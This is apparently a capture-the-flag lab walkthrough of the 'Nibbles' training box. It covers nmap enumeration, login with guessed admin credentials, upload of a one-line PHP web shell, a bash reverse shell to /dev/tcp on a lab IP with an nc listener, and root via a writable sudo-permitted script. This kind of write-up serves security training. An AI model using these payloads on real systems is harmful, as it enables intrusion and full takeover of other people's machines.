# Attacking Your First Box - Nibbles

## Enumeration

<figure><img src="../../.gitbook/assets/image (457).png" alt=""><figcaption></figcaption></figure>

* Run an nmap script scan on the target. What is the Apache version running on the server? (answer format: X.X.XX)

```
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.76.162
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-10 13:02 CDT
Nmap scan report for 10.129.76.162
Host is up (0.0090s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Web Footprinting

This shows us how crucial thorough enumeration is. Let us recap what we have found so far:

* We started with a simple `nmap` scan showing two open ports
* Discovered an instance of `Nibbleblog`
* Analyzed the technologies in use using `whatweb`
* Found the admin login portal page at `admin.php`
* Discovered that directory listing is enabled and browsed several directories
* Confirmed that `admin` was the valid username
* Found out the hard way that IP blacklisting is enabled to prevent brute-force login attempts
* Uncovered clues that led us to a valid admin password of nibbles

## Initial Foothold

Try with defaults credentails, `admin : nibbles` and enter -->

<figure><img src="../../.gitbook/assets/image (458).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (459).png" alt=""><figcaption></figcaption></figure>

```
nano ws.php
##
<?php system($_GET['cmd']); ?>
```

<figure><img src="../../.gitbook/assets/image (460).png" alt=""><figcaption></figcaption></figure>

Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`. In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.

<figure><img src="../../.gitbook/assets/image (461).png" alt=""><figcaption></figcaption></figure>

```
bash -c 'bash -i >%26 /dev/tcp/10.10.15.199/1234 0>%261'
## nc
nc -lvnp 1234
```

<figure><img src="../../.gitbook/assets/image (462).png" alt=""><figcaption></figcaption></figure>

* Gain a foothold on the target and submit the user.txt flag

```
nibbler@Nibbles:/home$ ls -la
ls -la
total 12
drwxr-xr-x  3 root    root    4096 Dec 10  2017 .
drwxr-xr-x 23 root    root    4096 Mar 12  2024 ..
drwxr-xr-x  3 nibbler nibbler 4096 Mar 12  2021 nibbler
nibbler@Nibbles:/home$ cd nibbler
cd nibbler
nibbler@Nibbles:/home/nibbler$ ls -la
ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Mar 12  2021 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Mar 12  2021 user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
79c03865431abf47.......
```

## Privilege Escalation

Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the `personal.zip` file and see a file called `monitor.sh`.

```shell-session
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
```

If we do a `sudo -l` we can see it too -->

<figure><img src="../../.gitbook/assets/image (463).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (464).png" alt=""><figcaption></figcaption></figure>

In this capture, we can see that im the propietary about monitor.sh. So, delete it and create a new with only "bash" word. With, we can execute it with sudo

<pre><code><strong>rm monitor.sh
</strong>
<strong>echo "bash" > monitor.sh
</strong>
<strong>sudo ./monitor.sh 
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (465).png" alt=""><figcaption></figcaption></figure>
